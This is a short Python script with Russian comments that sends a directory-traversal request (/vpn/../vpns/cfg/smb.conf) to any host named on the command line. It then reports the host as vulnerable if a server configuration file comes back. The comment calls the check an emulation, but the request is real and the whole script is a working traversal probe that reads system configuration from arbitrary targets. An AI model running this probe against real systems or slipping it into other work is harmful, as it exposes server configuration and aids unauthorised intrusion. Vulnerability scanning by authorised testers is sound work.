
import sys, requests

base = (sys.argv[1] if len(sys.argv) > 1 else "https://example.com").rstrip("/")
payload_path = "/vpn/../vpns/cfg/smb.conf"
url = base + payload_path

print("[*] Сформирован запрос, похожий на попытку Directory Traversal:")
print("    ", url)

# Эмуляция "проверки"
try:
    r = requests.get(url, timeout=5)
    if r.status_code == 200 and "[global]" in r.text:
        print("[+] Похоже на уязвимость: сервер отдал конфиг (найдено '[global]').")
    else:
        print("[-] Не подтверждено: код =", r.status_code)
except requests.RequestException as e:
    print("[!] Запрос не выполнен", e)